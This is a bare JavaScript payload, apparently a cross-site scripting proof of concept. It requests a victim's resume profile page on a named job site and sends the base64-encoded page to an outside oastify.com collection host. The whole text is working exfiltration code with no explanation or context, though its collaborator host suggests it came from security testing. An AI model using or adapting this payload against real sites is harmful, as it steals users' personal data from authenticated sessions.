var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://job.inshokuten.com/member/resume/profile', false);
xhr.send(null);

if (xhr.status === 200) { // Check if the request was successful
    var exfil = new XMLHttpRequest();
    var encodedResponse = encodeURIComponent(btoa(xhr.responseText));
    var exfilUrl = "https://pe72mwfoexb0vbncnd77uk380z6quim6b.oastify.com/?r=" + encodedResponse;
    exfil.open("GET", exfilUrl, false);
    exfil.send();
}
